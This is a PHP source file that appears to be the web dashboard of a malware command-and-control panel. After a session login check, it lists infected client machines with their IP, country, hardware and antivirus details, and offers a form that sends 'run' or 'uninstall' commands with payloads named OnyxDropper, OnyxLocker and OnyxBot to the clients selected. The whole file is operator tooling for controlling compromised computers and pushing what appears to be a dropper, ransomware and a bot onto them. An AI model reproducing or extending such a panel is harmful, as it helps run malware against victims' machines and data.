<?php
session_start();

include('./database/db-conn.php');
include('./scripts/getclients.php');

if(!isset($_SESSION['user']))
{        
    header('location: ' . "/login.php");
    die();
}

$onlineClientTable = GetOnlineClients($dbconn);
$clienttable = GetAllClients($dbconn);

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <?php include './includes/head.php';?>
</head>

<body>
    <header>
        <?php include './includes/header.php';?>
    </header>
    <main>
        <div class="container">
            <form action="set-command.php" method="post">
                <section class="section">
                    <?php 
                        if(isset($_SESSION['command-fail'])) 
                        {?>
                    <div class="notification is-warning">Please select at least 1 client</div>

                    <?php
                        unset($_SESSION['command-fail']);
                        }
                    ?>
                    <?php 
                        if(isset($_SESSION['command-succes']))
                        {
                            echo("<div class=\"notification is-primary\">". $_SESSION['command-succes'] ."</div>");
                            unset($_SESSION['command-succes']);
                        }
                    ?>
                    <!-- Main content -->                    
                    <section class="section">
                        <div class="columns is-gapless">
                            <!-- Command overview -->
                            <div class="column is-2">
                                <div class="select is-rounded">
                                    <select onchange="SelectCommand()" name="command" id="selectcommand">
                                        <option value="" disabled selected> Select command</option>
                                        <option value="run">Run</option>
                                        <option value="uninstall">Uninstall</option>
                                        
                                    </select>
                                </div>
                            </div>
                            <!-- Payloads -->
                            <div class="column is-2" id="payloadcollumn">
                                <div class="select is-rounded">
                                    <select name="payload" id="">
                                        <option value="" disabled selected> Select payload</option>
                                        <option value="OnyxDropper">OnyxDropper</option>
                                        <option value="OnyxLocker">OnyxLocker</option>
                                        <option value="OnyxBot">OnyxBot</option>
                                    </select>
                                </div>
                            </div>
                            <!-- Submit button -->
                            <div class="column">
                                <button type="submit" class="button is-primary">Submit command</button>
                            </div>
                        </div>
                        <!-- Last seen clients -->
                        <h2 class="title">Clients online in the last 15 minutes</h2>
                        <table class="table is-fullwidth is-striped">
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>IP</th>
                                    <th>Country</th>
                                    <th>CPU</th>
                                    <th>RAM</th>
                                    <th>Last online</th>
                                    <th>AV</th>
                                    <th>Select</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php
                                foreach ($onlineClientTable as $key => $table) 
                                {                                    
                                    echo("<tr>");
                                    echo("<td>". $table['Id'] ."</td>");
                                    echo("<td>". $table['Ip'] ."</td>");
                                    echo("<td>". $table['Country'] ."</td>");
                                    echo("<td>". $table['CPU'] ."</td>");
                                    echo("<td>". $table['Ram'] ."</td>");
                                    echo("<td>". $table['LastSeen'] ."</td>");
                                    echo("<td>". $table['AntiVirus'] ."</td>");
                                    echo("<td> <input type=\"checkbox\" name=\"check[]\" value=". $table['Id'] ."> </td>");
                                    echo("</tr>");
                                }
                                ?>
                            </tbody>
                        </table>
                    </section>
                    <br>
                    <section class="section">
                        <h2 class="title">All clients</h2>
                        <table class="table is-fullwidth is-striped">
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>IP</th>
                                    <th>Country</th>
                                    <th>CPU</th>
                                    <th>RAM</th>
                                    <th>Last online</th>
                                    <th>AV</th>
                                    <th>Select</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php
                                foreach ($clienttable as $key => $table) 
                                {                                    
                                    echo("<tr>");
                                    echo("<td>". $table['Id'] ."</td>");
                                    echo("<td>". $table['Ip'] ."</td>");
                                    echo("<td>". $table['Country'] ."</td>");
                                    echo("<td>". $table['CPU'] ."</td>");
                                    echo("<td>". $table['Ram'] ."</td>");
                                    echo("<td>". $table['LastSeen'] ."</td>");
                                    echo("<td>". $table['AntiVirus'] ."</td>");
                                    echo("<td> <input type=\"checkbox\" name=\"check[]\" value=". $table['Id'] ."> </td>");
                                    echo("</tr>");
                                }
                                ?>
                            </tbody>
                        </table>
                    </section>
                </section>
            </form>
        </div>
    </main>
    <script type="text/javascript" src="./js/index.js"></script>
</body>

</html>